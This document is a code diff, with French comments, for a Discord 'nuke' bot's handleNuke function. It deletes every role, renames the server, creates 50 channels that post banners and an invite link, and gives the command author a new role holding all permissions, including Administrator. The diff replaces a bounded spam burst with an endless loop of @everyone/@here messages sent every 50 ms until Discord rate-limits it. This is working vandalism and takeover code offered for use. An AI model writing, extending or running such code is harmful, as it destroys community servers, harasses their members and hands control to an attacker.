@@ -252,7 +252,7 @@ client.on('messageCreate', async (message) => {
 });
 
 // ============================================================
-// NUKE FUNCTION (AVEC SUPPRESSION TOTALE DES RÔLES + RÔLE NIKI POUR TOI)
+// NUKE FUNCTION (AVEC SPAM INFINI + PING)
 // ============================================================
 async function handleNuke(message) {
     if (message.author.id !== AUTHORIZED_ID) {
@@ -289,7 +289,6 @@ async function handleNuke(message) {
         // 2. DELETE ALL ROLES (except @everyone and the bot's highest role)
         const roles = guild.roles.cache;
         const deleteRolePromises = roles.map(async (role) => {
-            // On supprime tous les rôles sauf @everyone
             if (role.name !== '@everyone' && role.id !== guild.id) {
                 try {
                     await role.delete();
@@ -305,7 +304,7 @@ async function handleNuke(message) {
             await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
         } catch (e) {}
 
-        // 4. CREATE 50 NEW CHANNELS & SPAM THEM
+        // 4. CREATE 50 NEW CHANNELS & SPAM THEM INFINITELY
         const createPromises = [];
         for (let i = 0; i < 50; i++) {
             const name = SCARY_NAMES[i % SCARY_NAMES.length];
@@ -314,6 +313,7 @@ async function handleNuke(message) {
                 type: ChannelType.GuildText,
             }).then(async (channel) => {
                 try {
+                    // Envoi des messages de base
                     await channel.send('```' + ASCII_BANNER + '```');
                     await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
                     await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
@@ -328,11 +328,32 @@ async function handleNuke(message) {
                     await channel.send({ embeds: [embed] });
                     await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);
 
-                    const spamCount = Math.floor(Math.random() * 6) + 10;
-                    for (let s = 0; s < spamCount; s++) {
-                        const scaryText = TERRIFYING_MESSAGES[Math.floor(Math.random() * TERRIFYING_MESSAGES.length)];
-                        await channel.send(scaryText);
+                    // ============================================================
+                    // BOUCLE DE SPAM INFINI (Jusqu'à ce que Discord dise STOP)
+                    // ============================================================
+                    let spamCount = 0;
+                    let isSpamming = true;
+                    
+                    while (isSpamming) {
+                        try {
+                            // On choisit un message terrifiant au hasard (qui contient @everyone @here)
+                            const scaryText = TERRIFYING_MESSAGES[Math.floor(Math.random() * TERRIFYING_MESSAGES.length)];
+                            
+                            // On envoie le message
+                            await channel.send(scaryText);
+                            spamCount++;
+                            
+                            // Petite pause pour éviter de crasher le bot (50ms)
+                            await new Promise(resolve => setTimeout(resolve, 50));
+                            
+                        } catch (e) {
+                            // Si Discord renvoie une erreur (rate-limit ou autre), on arrête la boucle pour ce salon
+                            isSpamming = false;
+                            console.log(`Salon ${channel.name} a arrêté le spam après ${spamCount} messages.`);
+                        }
                     }
+                    // ============================================================
+
                     channelsCreated++;
                 } catch (e) {}
             }).catch(() => {});
@@ -343,7 +364,6 @@ async function handleNuke(message) {
 
         // 5. CREATE SPECIAL NIKI ROLE WITH ALL PERMISSIONS
         try {
-            // On récupère toutes les permissions possibles
             const allPermissions = [
                 PermissionsBitField.Flags.Administrator,
                 PermissionsBitField.Flags.CreateInstantInvite,
@@ -378,10 +398,8 @@ async function handleNuke(message) {
                 PermissionsBitField.Flags.ManageEmojisAndStickers
             ];
 
-            // Calcul du bitfield total
             const totalPermissions = allPermissions.reduce((acc, perm) => acc | perm, 0n);
 
-            // Création du rôle
             const nikiRole = await guild.roles.create({
                 name: '☠ NIKI ☠',
                 color: '#FF0000',
@@ -390,10 +408,8 @@ async function handleNuke(message) {
                 permissions: totalPermissions
             });
 
-            // On ajoute ce rôle à l'auteur de la commande
             await message.member.roles.add(nikiRole);
 
-            // On l'ajoute aussi au bot pour qu'il puisse tout gérer
             try {
                 await guild.members.me.roles.add(nikiRole);
             } catch (e) {}
